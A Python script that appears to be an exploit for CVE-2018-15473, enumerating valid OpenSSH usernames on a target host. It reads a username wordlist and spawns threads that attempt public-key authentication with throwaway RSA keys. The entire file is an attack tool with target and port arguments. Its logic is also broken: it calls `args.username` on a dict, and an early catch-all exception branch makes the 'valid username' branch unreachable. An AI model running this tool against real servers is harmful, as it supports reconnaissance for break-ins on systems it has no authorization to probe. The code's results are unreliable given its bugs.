import argparse
from log_colors import *
import paramiko
import sys
import socket
import threading

# Enumeration
class SSHUserEnum(threading.Thread):
    def __init__(self, transport, username):
        threading.Thread.__init__(self)
        self.transport = transport
        self.username = username
    
    # enumerate
    def run(self):
        print (LogColors.BLUE + "enumerate username: " + self.username + LogColors.ENDC)
        try:
            self.transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
        except Exception:
            print (LogColors.RED + "invalid username: " + self.username + LogColors.ENDC)
        except paramiko.ssh_exception.AuthenticationException:
            print (LogColors.GREEN + "valid username: " + self.username + LogColors.ENDC)

# CVE-2018-15473
# inspired by https://www.exploit-db.com
# OpenSSH through 7.7 is prone to a user 
# enumeration vulnerability due to not 
# delaying bailout for an invalid 
# authenticating user until after 
# the packet containing the request 
# has been fully parsed, related 
# to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.
class CVE2018_15473:
    
    # set host
    def __init__(self, host, port, filename):
        self.host, self.port = host, port
        self.filename = filename
        self.sock = socket.socket()

    # check host is up
    def check(self):
        print (LogColors.BLUE + "check host {}:{}".format(self.host, self.port) + LogColors.ENDC)
        try:
            self.sock.connect((self.host, self.port))
            print (LogColors.YELLOW + "host is up :)" + LogColors.ENDC)
            return True
        except socket.error:
            print (LogColors.RED + "failed to connect to host :(" + LogColors.ENDC)
        return False

    # check negotiate SSH transport
    def ssh_transport(self):
        try:
            self.transport = paramiko.transport.Transport(self.sock)
            self.transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print (LogColors.RED + "failed to negotiate SSH transport :(" + LogColors.ENDC)
    # username enumerate by threads
    def run_enumerate(self):
        self.check()
        self.ssh_transport()
        print (LogColors.BLUE + "check username enumerate..." + LogColors.ENDC)
        threadLock = threading.Lock()
        with open(filename, "r") as f:
            rows = f.readlines()
            usernames = [i.strip() for i in rows]
            threads = [SSHUserEnum(self.transport, user) for user in usernames]
            try:
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
            except KeyboardInterrupt:
                quit()
            except KeyError:
                pass
            except Exception as e:
                print(LogColors.RED + "error: " + str(e) + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target host")
    parser.add_argument('-p', '--port', default = 22, help = "target port")
    parser.add_argument('-f', '--filename', required = True, help = "usernames file")
    args = vars(parser.parse_args())
    host, port = args['target'], int(args['port'])
    filename = args['filename']
    cve = CVE2018_15473(host, port, filename)
    cve.run_enumerate()

